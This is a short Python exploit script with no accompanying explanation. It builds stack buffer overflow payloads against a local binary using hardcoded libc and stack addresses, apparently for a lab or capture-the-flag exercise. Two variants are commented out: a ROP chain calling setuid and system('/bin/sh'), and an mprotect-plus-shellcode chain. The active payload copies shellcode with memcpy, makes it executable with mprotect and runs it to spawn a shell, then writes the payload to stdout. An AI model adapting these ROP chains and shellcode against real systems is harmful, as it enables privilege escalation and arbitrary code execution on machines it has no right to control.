import sys
import struct

libc = 0x7ffff7a3a000
rbp = 0x7fffffffe070 #0x7fffffffe0f0

# get shell using ROP chain
'''
payload = b'A' * 0x80
payload += b'BBBBBBBB'

setuid = struct.pack("Q", 0x7ffff7af2fa0)
system = struct.pack("Q", 0x7ffff7a79480)
exit = struct.pack("Q", 0x7ffff7a6f980)
bin_sh = struct.pack("Q", 0x7ffff7b9bc19)
pop_rdi = struct.pack("Q", 0x7ffff7bac9fd)
zero = struct.pack("Q", 0)

payload += pop_rdi
payload += zero
payload += setuid
payload += pop_rdi
payload += bin_sh
payload += system
payload += exit
'''

# get shell using mprotect and assembly code
'''
mprotect = struct.pack("Q", 0x7ffff7b1e710)
pop_rdi = struct.pack("Q", libc + 0x1729fd)
pop_rdx_rsi = struct.pack("Q", libc + 0xf54f9)
stack_address = struct.pack("Q", 0x7ffffffde000)
stack_size = struct.pack("Q", 0x21000)
permissions = struct.pack("Q", 0x7)
shellcode_address = struct.pack("Q", rbp - 0x80)

shellcode = b'\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05'

payload = shellcode
payload += b'A' * ( 0x80 - len(shellcode) )
payload += b'BBBBBBBB'
payload += pop_rdi
payload += stack_address
payload += pop_rdx_rsi
payload += permissions
payload += stack_size
payload += mprotect
payload += shellcode_address
'''

# get shell using mprotect and memcpy

shellcode = b'\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05'

mprotect = struct.pack("Q", 0x7ffff7b1e710)
memcpy = struct.pack("Q", 0x7ffff7ac3100)
pop_rdi = struct.pack("Q", libc + 0x1729fd)
pop_rdx_rsi = struct.pack("Q", libc + 0xf54f9)
stack_address = struct.pack("Q", 0x7ffffffde000)
permissions = struct.pack("Q", 0x5) # execute and read
shellcode_address = struct.pack("Q", rbp - 0x80)
shellcode_size = struct.pack("Q", len(shellcode))

payload = shellcode
payload += b'A' * ( 0x80 - len(shellcode) )
payload += b'BBBBBBBB'

payload += pop_rdi + stack_address
payload += pop_rdx_rsi + shellcode_size + shellcode_address
payload += memcpy
payload += pop_rdi + stack_address
payload += pop_rdx_rsi + permissions + shellcode_size
payload += mprotect
payload += stack_address



sys.stdout.buffer.write(payload)
